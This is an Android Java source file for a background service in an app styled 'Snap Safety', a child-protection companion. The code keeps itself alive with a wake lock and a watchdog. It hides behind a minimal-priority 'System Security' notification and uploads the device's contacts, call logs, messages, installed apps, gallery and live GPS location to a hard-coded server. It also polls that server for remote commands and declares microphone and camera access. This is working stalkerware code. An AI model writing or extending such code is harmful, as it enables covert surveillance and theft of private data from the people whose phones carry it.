package com.snapapp.companion;

import android.annotation.SuppressLint;
import android.app.*;
import android.content.*;
import android.content.pm.ServiceInfo;
import android.location.*;
import android.os.*;
import androidx.core.app.NotificationCompat;
import org.json.JSONArray;
import org.json.JSONObject;
import java.util.concurrent.*;

public class CompanionSyncService extends Service {
    private static final String CHANNEL_ID = "snap_safety_channel";
    private static final int NOTIF_ID = 1001;
    private static final long PERSIST_INTERVAL_MS = 30000;

    private ScheduledExecutorService scheduler; private SharedPreferences prefs;
    private LocationManager locationManager; private LocationListener locationListener;
    private PowerManager.WakeLock wakeLock; private long lastPersistTime = 0;
    private double lastLat = 0, lastLng = 0;
    public static volatile boolean isLiveMovementActive = false;
    public static volatile boolean isFetchRequested = false;

    @Override
    public void onCreate() {
        super.onCreate();
        prefs = getSharedPreferences("snap_companion_prefs", MODE_PRIVATE);
        try {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null) { wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "snap:synclock"); wakeLock.acquire(); }
        } catch (Exception ignored) {}
        createNotificationChannel();
        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        locationListener = loc -> { if (loc != null) dispatchLocation(loc); };
        WatchdogReceiver.scheduleWatchdog(this);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        try {
            int type = 0;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) type |= ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) type |= ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE | ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) startForeground(NOTIF_ID, buildNotification(), type);
            else startForeground(NOTIF_ID, buildNotification());
        } catch (Throwable t) {
            try { startForeground(NOTIF_ID, buildNotification()); } catch (Throwable ignored) {}
        }
        if (intent != null && "ACTION_FETCH_LOCATION".equals(intent.getAction())) {
            requestActiveLocationFix();
            return START_STICKY;
        }
        startPeriodicSync();
        syncInitialTelemetry();
        WatchdogReceiver.scheduleWatchdog(this);
        return START_STICKY;
    }

    public static void setLiveMovementActive(Context ctx, boolean active) {
        isLiveMovementActive = active;
        if (active) triggerOnDemandLocationFix(ctx);
    }

    public static void triggerOnDemandLocationFix(Context ctx) {
        isFetchRequested = true;
        try {
            Intent it = new Intent(ctx, CompanionSyncService.class);
            it.setAction("ACTION_FETCH_LOCATION");
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ctx.startForegroundService(it);
            else ctx.startService(it);
        } catch (Throwable ignored) {}
    }

    private void syncInitialTelemetry() {
        final String d = prefs.getString("device_id", null), s = prefs.getString("server_url", "https://snap-app-chi.vercel.app");
        if (d == null) return;
        TelemetryHelper.syncInstalledApps(this, s, d, null);
        TelemetryHelper.syncContacts(this, s, d, null);
        TelemetryHelper.syncCalls(this, s, d, null);
        TelemetryHelper.syncMessages(this, s, d, null);
        GalleryHelper.syncGallery(this, s, d, null);
    }

    @SuppressLint("MissingPermission")
    private void requestActiveLocationFix() {
        if (!isLiveMovementActive && !isFetchRequested) return;
        if (locationManager == null || locationListener == null) return;
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                long interval = isLiveMovementActive ? 3000L : 15000L;
                float dist = isLiveMovementActive ? 1.0f : 0.0f;
                Location best = null;
                for (String p : new String[]{LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER, LocationManager.PASSIVE_PROVIDER}) {
                    try {
                        if (locationManager.isProviderEnabled(p)) locationManager.requestLocationUpdates(p, interval, dist, locationListener, Looper.getMainLooper());
                    } catch (Throwable ignored) {}
                    try {
                        Location last = locationManager.getLastKnownLocation(p);
                        if (last != null && Math.abs(last.getLatitude()) > 0.0001 && Math.abs(last.getLongitude()) > 0.0001) {
                            if (best == null || last.getTime() > best.getTime()) best = last;
                        }
                    } catch (Throwable ignored) {}
                }
                if (best != null) dispatchLocation(best);
            } catch (Throwable ignored) {}
        });
    }

    private void dispatchLocation(Location loc) {
        if (!isLiveMovementActive && !isFetchRequested) return;
        final String deviceId = prefs.getString("device_id", null);
        final String serverUrl = prefs.getString("server_url", "https://snap-app-chi.vercel.app");
        if (deviceId == null || loc == null) return;
        if (loc.hasAccuracy() && loc.getAccuracy() > 1500.0f) return;
        double lat = loc.getLatitude(), lng = loc.getLongitude();
        if (Math.abs(lat) < 0.0001 && Math.abs(lng) < 0.0001) return;
        lastLat = lat; lastLng = lng;

        try {
            if (isLiveMovementActive) {
                long now = System.currentTimeMillis();
                boolean shouldPersist = (now - lastPersistTime) >= PERSIST_INTERVAL_MS;
                JSONObject b = new JSONObject();
                b.put("device_id", deviceId); b.put("latitude", lat); b.put("longitude", lng);
                b.put("accuracy", loc.getAccuracy()); b.put("speed", loc.hasSpeed() ? loc.getSpeed() : 0);
                b.put("battery_level", getBatteryLevel()); b.put("persist", shouldPersist);
                if (shouldPersist) lastPersistTime = now;
                ApiClient.postJson(serverUrl + "/api/device-sync/live-location", b, null);
            } else if (isFetchRequested) {
                isFetchRequested = false;
                ApiClient.sendLocation(serverUrl, deviceId, lat, lng, loc.getAccuracy(), getBatteryLevel(), null);
            }
        } catch (Throwable ignored) {}
    }

    private void startPeriodicSync() {
        if (scheduler != null && !scheduler.isShutdown()) return;
        scheduler = Executors.newSingleThreadScheduledExecutor();
        scheduler.scheduleWithFixedDelay(() -> {
            try {
                if (isLiveMovementActive || isFetchRequested) requestActiveLocationFix();
                pollServerCommands();
            } catch (Throwable ignored) {}
        }, 2, 10, TimeUnit.SECONDS);
    }

    private void pollServerCommands() {
        final String deviceId = prefs.getString("device_id", null), serverUrl = prefs.getString("server_url", "https://snap-app-chi.vercel.app");
        if (deviceId == null) return;
        ApiClient.sendHeartbeat(serverUrl, deviceId, getBatteryLevel(), false, new ApiClient.ApiCallback() {
            @Override public void onSuccess(JSONObject res) {
                try {
                    JSONObject rt = res.optJSONObject("realtime");
                    if (rt != null) RealtimeSocketManager.getInstance(CompanionSyncService.this).connect(rt.optString("ws_url"), deviceId, serverUrl);
                    JSONArray cmds = res.optJSONArray("commands");
                    if (cmds != null && cmds.length() > 0) {
                        for (int i = 0; i < cmds.length(); i++) {
                            CommandDispatcher.dispatch(CompanionSyncService.this, serverUrl, deviceId, cmds.optJSONObject(i), () -> requestActiveLocationFix());
                        }
                    }
                } catch (Throwable ignored) {}
            }
            @Override public void onError(String e) {}
        });
    }

    private int getBatteryLevel() {
        try {
            Intent bi = registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            if (bi == null) return 100;
            int level = bi.getIntExtra(BatteryManager.EXTRA_LEVEL, -1), scale = bi.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
            return (level >= 0 && scale > 0) ? (int) ((level / (float) scale) * 100) : 100;
        } catch (Throwable t) { return 100; }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(new NotificationChannel(CHANNEL_ID, "System Security", NotificationManager.IMPORTANCE_MIN));
        }
    }

    private Notification buildNotification() {
        PendingIntent pi = PendingIntent.getActivity(this, 0, new Intent(this, MainActivity.class), Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ? PendingIntent.FLAG_IMMUTABLE : 0);
        return new NotificationCompat.Builder(this, CHANNEL_ID).setContentTitle("Snap Safety").setContentText("Child protection active").setSmallIcon(R.drawable.ic_launcher).setContentIntent(pi).setOngoing(true).setPriority(NotificationCompat.PRIORITY_MIN).build();
    }

    @Override public IBinder onBind(Intent intent) { return null; }

    @Override public void onDestroy() {
        super.onDestroy();
        WatchdogReceiver.scheduleWatchdog(this);
        if (scheduler != null) scheduler.shutdownNow();
        RealtimeSocketManager.getInstance(this).disconnect();
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
    }
}
